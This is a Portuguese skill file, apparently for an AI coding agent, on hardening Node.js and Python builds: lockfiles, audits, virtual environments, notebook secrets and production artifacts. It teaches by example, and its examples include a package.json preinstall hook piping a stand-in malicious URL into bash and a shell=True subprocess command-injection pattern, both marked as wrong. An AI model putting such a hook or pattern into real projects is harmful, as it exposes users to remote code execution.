---
name: node-python-build-hardening
description: Hardening para Node.js, Python, builds, scripts, automações e CLIs. Cobre lockfiles, scripts de package.json, ambientes virtuais, versões fixas, build output seguro e proteção de .env em projetos de build.
---

# node-python-build-hardening

Use esta skill para projetos Node.js, Python, scripts de automação, ferramentas de build (Vite, Webpack, esbuild), CLIs, notebooks Jupyter e qualquer ferramenta que rode localmente ou em CI/CD.

## Perguntas internas obrigatórias

### Node.js
1. O `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` está versionado?
2. Os scripts em `package.json` (especialmente `preinstall`, `postinstall`, `prepare`) foram revisados?
3. `npm audit` foi rodado recentemente?
4. O build exporta source maps em produção?
5. Há variáveis de ambiente no build que expõem segredos (`VITE_`, `NEXT_PUBLIC_`)?
6. Dependências de dev estão sendo enviadas para produção?

### Python
1. Há ambiente virtual (venv, conda, poetry)?
2. `requirements.txt` tem versões fixas (com `==`)?
3. `pip freeze` ou `poetry lock` está atualizado?
4. Há segredos em notebooks `.ipynb` (células de saída com token, chave)?
5. Há scripts que fazem `os.system()` ou `subprocess` com input externo?

### Geral
1. Scripts de build executam código de origem não verificada?
2. O diretório de build (`dist/`, `build/`, `.next/`) é publicado com arquivos desnecessários?

## Node.js — regras obrigatórias

### Lockfile
```bash
# Instalar com lockfile (não atualiza dependências)
npm ci          # usa package-lock.json
pnpm install --frozen-lockfile
yarn install --immutable

# Nunca em produção:
npm install     # pode atualizar e gerar lockfile diferente
npm update      # atualiza versões
```

### Scripts em package.json — revisar antes de instalar
```json
// Revisar SEMPRE estes scripts em pacotes desconhecidos:
{
  "scripts": {
    "preinstall": "curl https://malicioso.com | bash",  // RED FLAG
    "postinstall": "node ./scripts/setup.js",           // revisar o que faz
    "prepare": "husky install"                          // comum, mas verificar
  }
}
```

Para instalar pacote sem executar scripts (revisar depois):
```bash
npm install --ignore-scripts nome-do-pacote
```

### npm audit
```bash
# Rodar sempre antes de deploy
npm audit --production   # apenas dependências de produção

# NUNCA rodar sem análise prévia:
npm audit fix --force    # pode fazer MAJOR bump e quebrar API
```

### .env em projetos Node
```javascript
// Nunca commitar .env
// Usar dotenv corretamente
require('dotenv').config();

// Verificar que .env está no .gitignore
// Criar .env.example com placeholders
```

### Build output
Verificar o que vai para o bundle de produção:
- `dist/` não deve conter `.env`
- Source maps em produção: avaliar se o código é proprietário
- `node_modules/` não deve ir para o servidor (usar `npm ci --production` no servidor)
- Arquivos de teste não devem ir para produção

## Python — regras obrigatórias

### Ambiente virtual (obrigatório)
```bash
# Criar ambiente virtual
python -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate     # Windows

# Nunca instalar globalmente em projeto isolado
# pip install ... na máquina do dev contamina todos os projetos
```

### Versões fixas em requirements.txt
```
# ERRADO — versão não fixada
requests
flask
numpy

# CORRETO — versão exata
requests==2.31.0
flask==3.0.0
numpy==1.26.4
```

Para gerar com versões fixas:
```bash
pip freeze > requirements.txt
```

### Poetry (alternativa recomendada)
```bash
# Instalar dependências com lockfile
poetry install --no-root

# Adicionar dependência (analisa antes de confirmar)
poetry add nome-pacote

# Em produção (sem dev)
poetry install --only main
```

### Notebooks Jupyter — riscos específicos
```python
# Limpar saídas antes de commitar
# Saída de células pode conter: tokens, resultados de API com dados sensíveis

# ERRADO — token no notebook
headers = {"Authorization": "Bearer sk-abc123..."}
response = requests.get(url, headers=headers)
print(response.json())  # aparece na saída da célula

# CORRETO
import os
token = os.environ.get("API_TOKEN")  # .env carregado anteriormente
```

Usar `nbstripout` para limpar saídas automaticamente:
```bash
# Instalar
pip install nbstripout

# Configurar hook git (nunca commita outputs)
nbstripout --install
```

### subprocess e execução de comandos
```python
# ERRADO — command injection
import subprocess
subprocess.run(f"grep {user_input} arquivo.log", shell=True)

# CORRETO — lista de argumentos, sem shell=True
subprocess.run(["grep", user_input, "arquivo.log"], check=True)

# Nunca usar shell=True com input do usuário
```

## Scripts de build — regras gerais

### Verificar antes de rodar qualquer script de build
1. Quem criou o script?
2. O script faz chamadas de rede? Para onde?
3. O script lê variáveis de ambiente sensíveis? Loga alguma?
4. O script tem acesso ao sistema de arquivos além do necessário?

### Ambientes de build
- Nunca rodar `npm install` / `pip install` em produção sem auditoria prévia
- Preferir **build em CI/CD** e enviar artefato pronto para produção
- Usar `--production` ou `--only main` para excluir dependências de dev

### Arquivos que não devem ir para produção
```
.env
.env.*
node_modules/ (exceto vendored quando necessário)
tests/
spec/
__tests__/
*.test.js
*.spec.js
.nyc_output/
coverage/
.git/
.claude/
*.md (README, CHANGELOG de dev)
docker-compose.override.yml
Makefile
Dockerfile (se não for para containerização explícita)
.github/
notebooks/ (se contiverem dados de dev)
```

## Checklist de saída

### Node.js
- [ ] Lockfile versionado e atual
- [ ] `npm ci` (não `npm install`) em CI/CD
- [ ] Scripts `preinstall`/`postinstall` revisados
- [ ] `npm audit` sem vulnerabilidades críticas/altas
- [ ] Variáveis de frontend (VITE_, NEXT_PUBLIC_) não contêm segredos
- [ ] Source maps em produção avaliados
- [ ] Dev dependencies excluídas do build de produção

### Python
- [ ] Ambiente virtual usado
- [ ] Versões fixas no `requirements.txt` ou `poetry.lock`
- [ ] Notebooks sem outputs com dados sensíveis (usar nbstripout)
- [ ] `subprocess` sem `shell=True` com input externo
- [ ] `.env` no `.gitignore`

### Geral
- [ ] Build não inclui arquivos de dev, testes, backups, .env
- [ ] Scripts de build revisados (sem chamadas de rede suspeitas)
- [ ] Artefato de produção testado antes de deploy

## Conexão com skills do vault

- Skill 14 (Supply Chain) — dependências, lockfile, SBOM, audit
- Skill 13 (DevOps/Deploy) — pipeline de build, CI/CD
- Skill 01 (Zero Trust) — subprocess, execução de comandos
- Skill 04 (Logs Seguros) — logs de build sem segredos

---

> 🧭 [[_HOME|🏠 HOME]] · [[skills-claude-code-MOC|⚙️ Skills Claude Code]] · [[Ecossistema-Skills-Agentes|🧩 Ecossistema]] · [[INDICE|🎯 Skills 00–18]] · [[agents-claude-code-MOC|🤖 Agentes]]
